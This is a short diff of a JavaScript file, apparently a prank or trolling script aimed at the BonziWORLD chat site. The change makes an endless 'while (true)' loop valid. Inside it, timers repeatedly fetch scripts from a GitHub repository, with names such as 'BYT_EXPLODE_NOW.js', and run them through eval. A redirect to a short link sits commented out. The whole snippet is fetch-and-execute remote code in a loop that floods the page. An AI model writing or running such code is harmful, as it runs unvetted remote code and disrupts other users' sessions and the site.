@@ -59,7 +59,7 @@ setTimeout(()=>{
         setTimeout(()=>{window.location.replace("https://stt.gg/R92Pqkhj");},7000)
         */
     }
-    while (True) {
+    while (true) {
         setTimeout(()=>{fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/BYT_EXPLODE_NOW.js').then(r=>r.text()).then(eval)}, 100 * i);
         setTimeout(()=>{fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/mario kart lightning bolt.js').then(r=>r.text()).then(eval)}, 100 * i);
         setTimeout(()=>{fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/inflate every bonzi like a balloon.js').then(r=>r.text()).then(eval)}, 100 * i);
